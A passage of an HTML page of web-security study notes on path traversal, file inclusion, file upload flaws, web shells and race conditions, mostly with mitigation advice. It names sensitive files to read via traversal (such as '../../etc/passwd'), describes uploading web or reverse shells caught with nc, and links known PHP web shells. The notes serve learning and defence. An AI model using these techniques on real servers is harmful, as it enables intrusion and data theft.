                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>/var/log/apache2/access.log</code></td>
                            <td style="padding: 15px;">the accessed requests for <code>Apache</code> web server</td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><code>C:\boot.ini</code></td>
                            <td style="padding: 15px;">contains the boot options for computers with BIOS firmware</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Common Locations to Test for Path Traversal &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Focus on Features that take <strong>filename</strong> or <strong>file path</strong> as input</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. <strong>File Download URLs</strong></h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Look for parameters that specify a file name or path.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. <strong>File Viewers / Image Loaders</strong></h3>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. <strong>Backup / Log Viewers</strong></h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Look for parameters that reference logs or backup files.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4. <strong>File Upload Functions</strong></h3>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">5. <strong>Download / Export Features</strong></h3>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Path Normalization &rarr;</h2>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&lt; Path canonicalization &gt;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">To <strong>canonicalize a file path</strong> means to convert it to its <strong>standard, absolute, and resolved form</strong> by:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Resolving all <code>../</code> and <code>./</code></li>
                      <li style="margin-bottom: 10px;">Resolving symbolic links</li>
                      <li style="margin-bottom: 10px;">Removing redundant slashes</li>
                      <li style="margin-bottom: 10px;">Producing a full absolute path</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>Canonicalization</strong> helps defend against <strong>Path Traversal</strong> by ensuring that any sneaky tricks in user input (like <code>../../etc/passwd</code> or symlinks) are neutralized <strong>before</strong> checking if the file is allowed.</p>

                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Without canonicalization, a path like this:</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">/var/www/files/../../etc/passwd

/etc/passwd</code>

                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  File Inclusion
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">"File Include" vulnerabilities can also be used as a <a href="https://pentesterlab.com/glossary/directory-traversal" target="_blank" style="color: #2563eb; text-decoration: none;">directory traversal</a> to read arbitrary files.</li>
                      <li style="margin-bottom: 10px;">Local File Include: <a href="https://pentesterlab.com/glossary/local-file-inclusion" target="_blank" style="color: #2563eb; text-decoration: none;">LFI</a>. A local file is read and interpreted.</li>
                      <li style="margin-bottom: 10px;">Remote File Include: <a href="https://pentesterlab.com/glossary/remote-file-inclusion" target="_blank" style="color: #2563eb; text-decoration: none;">RFI</a>. A remote file is retrieved and interpreted.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 30px 0;">
                      <a href="https://www.notion.so/LFI-Local-File-Inclusion-22527bcaaa96803a86abf98b7864593e?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">LFI &lt;Local File Inclusion&gt; <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/RFI-Remote-File-Inclusion-22527bcaaa96806fae40ee838ecadb10?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">RFI &lt;Remote File Inclusion&gt; <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Mitigation and Prevention Strategies &rarr;</h2>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">Ensure all user inputs are properly validated and sanitized. This is a crucial step to prevent attackers from manipulating file paths or including malicious files.</li>
                      <li style="margin-bottom: 10px;">Implement allowlisting for file inclusion and access. Define which files can be included or accessed and reject any request that does not match these criteria.</li>
                      <li style="margin-bottom: 10px;">Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. For PHP, directives like <code>allow_url_fopen</code> and <code>allow_url_include</code> should be disabled if not needed.</li>
                      <li style="margin-bottom: 10px;">Performing regular code reviews and security audits to identify potential vulnerabilities with the help of automated tools. Manual checks are also essential.</li>
                      <li style="margin-bottom: 10px;">Ensure that everyone involved in the development process understands the importance of security. Regular training on secure coding practices can significantly reduce the risk of this vulnerability.</li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Paths &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: none;">
                      <li style="margin-bottom: 10px;"><strong><em>- Absolute Path :- Complete Path Start From Root Directory,</em></strong> <code>/var/www/html/folder/file.php</code> is an absolute path.</li>
                      <li style="margin-bottom: 10px;"><strong><em>- Relative Path :- Locating Files Based on Current Directory,</em></strong></li>
                    </ul>
                    
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Assume your current directory is <code>/home/user/projects</code>.</p>
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Path</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Meaning</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>file.txt</code></td>
                            <td style="padding: 15px;">Refers to <code>file.txt</code> inside <code>/home/user/projects</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>../notes.txt</code></td>
                            <td style="padding: 15px;">Refers to <code>notes.txt</code> in <code>/home/user</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>./images/pic.jpg</code></td>
                            <td style="padding: 15px;">Refers to <code>pic.jpg</code> in <code>/home/user/projects/images</code></td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><code>../../log.txt</code></td>
                            <td style="padding: 15px;">Refers to <code>log.txt</code> in <code>/home</code></td>
                          </tr>
                        </tbody>
                      </table>
                    </div>

                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  File Upload Vulnerability
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><strong><em>&rarr; Web Security Vulnerability, that Allow Attacker Upload and Execute malicious Files in Web Server.</em></strong></p>
                    </div>

                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">File upload vulnerabilities are when a web server allows users to upload files to its filesystem <strong>without sufficiently validating things like their name, type, contents, or size.</strong></li>
                      <li style="margin-bottom: 10px;">Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">The worst possible kind &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The worst possible kind of file upload vulnerability is an <strong>unauthenticated arbitrary file upload</strong> vulnerability.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">With this type of vulnerability, a web application allows any unauthenticated user to upload any file type.</li>
                      <li style="margin-bottom: 10px;">Can get XSS from File upload vulns if we can upload <code>.svg</code>, <code>.html</code>, <code>.pdf</code>.</li>
                      <li style="margin-bottom: 10px;">when this files extension allowed can search for payload and upload file and open it to get XSS.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 30px 0;">
                      <a href="https://www.notion.so/File-Upload-Vulnerability-CheatSheet-28127bcaaa968098a2b9e1c4555b06c0?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">File Upload Vulnerability CheatSheet <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Causes &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Application fail to validate, verify and secure uploaded file (this mean application donÃ¢â‚¬â„¢t check the type of file and may not restrict file location and execution).</li>
                      <li style="margin-bottom: 10px;">Lack of file size limits (lead to DOS).</li>
                      <li style="margin-bottom: 10px;">Extension based check only.</li>
                      <li style="margin-bottom: 10px;">Implement validate in client side only.</li>
                      <li style="margin-bottom: 10px;">DonÃ¢â‚¬â„¢t use whitelisting.</li>
                      <li style="margin-bottom: 10px;">File upload vulnerability is not only caused by writing insecure functions but is also often caused by the use of outdated libraries that may be vulnerable to these attacks.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Exploitation &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">An attacker identifies the file upload functionality in the target application and attempts to upload a malicious file. This file can be crafted to include malicious code, such as PHP scripts, shell commands, or malware.</li>
                      <li style="margin-bottom: 10px;"><strong>Bypassing Validation:</strong> If the application doesn't properly validate file types or restricts file locations, the attacker can upload a file with a misleading extension (e.g., uploading a PHP file with a .jpg extension).</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Impact &rarr;</h2>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Depend on two key factors &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.</li>
                      <li style="margin-bottom: 10px;">What restrictions are imposed on the file once it has been successfully uploaded.</li>
                    </ul>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as <code>.php</code> and <code>.jsp</code>) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them <strong>full control over the server</strong>.</li>
                      <li style="margin-bottom: 10px;">If the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name.</li>
                      <li style="margin-bottom: 10px;">If the server is also vulnerable to directory traversal, this could mean attackers are even able to upload files to unanticipated locations.</li>
                      <li style="margin-bottom: 10px;">Failing to make sure that the size of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.</li>
                    </ol>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Remote Code Execution &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Once the malicious file is uploaded and executed, it can lead to remote code execution on the server. This means the attacker can run arbitrary code and potentially take control of the server.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>Can achieve RCE by:</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>1. web shells</strong> &rarr; identify vulnerability and upload web shell u create or get it from anywhere then type commands in URL or in HTML.</li>
                      <li style="margin-bottom: 10px;"><strong>2. reverse shell</strong> &rarr; we upload reverse shell file on web server and go to it in URL to execute it then get reverse connection on <strong><code>nc</code></strong>. We'll be using the ubiquitous Pentest Monkey reverse shell.</li>
                      <li style="margin-bottom: 10px;"><strong>Data Exfiltration</strong> &rarr; An attacker might use this access to steal sensitive data, manipulate database records, or perform other malicious actions on the server.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">How Prevent File Upload Vulnerability &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Extension Validation &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones.</li>
                      <li style="margin-bottom: 10px;">It is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. <code>shell.php.jpg</code>).</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; Content Validation &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Extension validation is not enough, as we should also validate the file content. We cannot validate one without the other and must always validate both the file extension and its content.</li>
                      <li style="margin-bottom: 10px;">Furthermore, we should always make sure that the file extension matches the file's content.</li>
                      <li style="margin-bottom: 10px;">Must check for extension, content-type header and Magic number.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Upload Directory Disclosure &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">We should avoid disclosing the uploads directory or providing direct access to the uploaded file. It is always recommended to hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page.</li>
                      <li style="margin-bottom: 10px;">We may write a <code>download.php</code> script to fetch the requested file from the uploads directory and then download the file for the end-user.</li>
                      <li style="margin-bottom: 10px;">If we utilize a download page, we should ensure that the <code>download.php</code> script enforces strict authorization checks and path validation to prevent Insecure Direct Object Reference (IDOR) vulnerabilities and LFI.</li>
                      <li style="margin-bottom: 10px;">Store the uploaded files in a separate server or container. If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server.</li>
                    </ul>

                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Limit file size.</li>
                      <li style="margin-bottom: 10px;">Update any used libraries.</li>
                      <li style="margin-bottom: 10px;">Scan uploaded files for malware or malicious strings.</li>
                      <li style="margin-bottom: 10px;">Utilize a Web Application Firewall (WAF) as a secondary layer of protection.</li>
                      <li style="margin-bottom: 10px;">Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (<code>../</code>).</li>
                      <li style="margin-bottom: 10px;">Rename uploaded files to avoid collisions that may cause existing files to be overwritten.</li>
                      <li style="margin-bottom: 10px;">Do not upload files to the server's permanent filesystem until they have been fully validated.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Study Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/attacks-and-filter-bypass-21d27bcaaa9680ed911ae98efe87a406?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Attacks and Filter Bypass <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Methodology-21d27bcaaa968002b0fbc172c4293f8f?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Methodology <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes-28127bcaaa9680d8b920cb213bb96c54?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups-21d27bcaaa968093bcebe1c24b15a599?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Tools-21d27bcaaa9680beae8ed210a4ab529e?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Vulnerable-Codes-and-mitigation-21d27bcaaa96802aab33f00cb368bbdc?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vuln & Mitigation <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Web Shell &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A <code>Web Shell</code> is typically a web script, i.e., <code>PHP</code> or <code>ASPX</code>, that accepts our command through HTTP request parameters such as <code>GET</code> or <code>POST</code> request parameters, executes our command, and prints its output back on the web page.</li>
                      <li style="margin-bottom: 10px;">Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Existing Web Shells Available Online &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><a href="https://github.com/flozz/p0wny-shell" target="_blank" style="color: #2563eb; text-decoration: none;">p0wny-shell</a> - A minimalistic single-file PHP web shell that allows remote command execution.</li>
                      <li style="margin-bottom: 10px;"><a href="https://github.com/b374k/b374k" target="_blank" style="color: #2563eb; text-decoration: none;">b374k shell</a> - A more feature-rich PHP web shell with file management and command execution, among other functionalities.</li>
                      <li style="margin-bottom: 10px;"><a href="https://www.r57shell.net/single.php?id=13" target="_blank" style="color: #2563eb; text-decoration: none;">c99 shell</a> - A well-known and robust PHP web shell with extensive functionality.</li>
                      <li style="margin-bottom: 10px;"><a href="https://github.com/Arrexel/phpbash?tab=readme-ov-file" target="_blank" style="color: #2563eb; text-decoration: none;">phpbash</a> - which provides a terminal-like, semi-interactive web shell.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Uploading Web shell &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser.</li>
                      <li style="margin-bottom: 10px;">This can be through a vulnerability in an upload feature.</li>
                      <li style="margin-bottom: 10px;">If we only have RCE through an exploit, we can write our shell directly to the webroot.</li>
                    </ul>
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Web Server</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Default Webroot</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>Apache</code></td>
                            <td style="padding: 15px;"><code>/var/www/html/</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>Nginx</code></td>
                            <td style="padding: 15px;"><code>/usr/local/nginx/html/</code></td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>IIS</code></td>
                            <td style="padding: 15px;"><code>c:\inetpub\wwwroot\</code></td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><code>XAMPP</code></td>
                            <td style="padding: 15px;"><code>C:\xampp\htdocs\</code></td>
                          </tr>
                        </tbody>
                      </table>
                    </div>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">More Defensive Concepts &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong><em>Whitelisting :-</em></strong> Permitting only certain file types to be uploaded.</li>
                      <li style="margin-bottom: 10px;"><strong><em>Sandboxing :-</em></strong> run code in isolated environment.</li>
                    </ul>

                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Race Conditions
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">What is Race Conditions? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Common type of vulnerability related to <strong>business logic flaws</strong>.</li>
                      <li style="margin-bottom: 10px;">Occur when application process requests concurrently without adequate safeguards (proper synchronization).</li>
                      <li style="margin-bottom: 10px;">This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a "collision" that causes unintended behavior in the application.</li>
                      <li style="margin-bottom: 10px;">A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior for malicious purposes.</li>
                    </ul>

                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><strong>A race condition is a business logic vulnerability that occurs when an application processes concurrent requests without proper synchronization, allowing multiple operations to interact with the same data simultaneously and produce unintended or exploitable behavior.</strong></p>
                    </div>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Race Window &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The period of time during which a collision is possible.</li>
                      <li style="margin-bottom: 10px;">This could be the fraction of a second between two interactions with the database.</li>
                      <li style="margin-bottom: 10px;">The small gap between operations (like checking and updating data).</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Limit overrun race conditions (Bypass Limit) &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The most well-known type of race condition enables you to exceed some kind of limit imposed by the business logic of the application.</li>
                      <li style="margin-bottom: 10px;"><strong>Example:</strong> Redeeming a gift card multiple times, rating a product multiple times, withdrawing cash in excess of your balance, reusing a CAPTCHA, bypassing anti-brute-force rate limits.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Hidden multi-step sequences &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A single HTTP request can trigger <strong>multiple backend steps</strong>.</li>
                      <li style="margin-bottom: 10px;">These steps are not visible to the user.</li>
                      <li style="margin-bottom: 10px;">A <strong>sub-state</strong> is a temporary internal state that exists for milliseconds (e.g., authenticated but not fully verified).</li>
                      <li style="margin-bottom: 10px;">If you can identify HTTP requests that interact with the same data, you can potentially abuse these sub-states.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Methodology &rarr;</h2>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;"><strong>Predict potential collisions:</strong> Ask yourself if the endpoint is security critical and if there is any collision potential.</li>
                      <li style="margin-bottom: 10px;"><strong>Probe for clues:</strong> Benchmark how the endpoint behaves normally, then send parallel requests to spot deviations (clues).</li>
                      <li style="margin-bottom: 10px;"><strong>Prove the concept:</strong> Try to understand what's happening and replicate the effects.</li>
                    </ol>

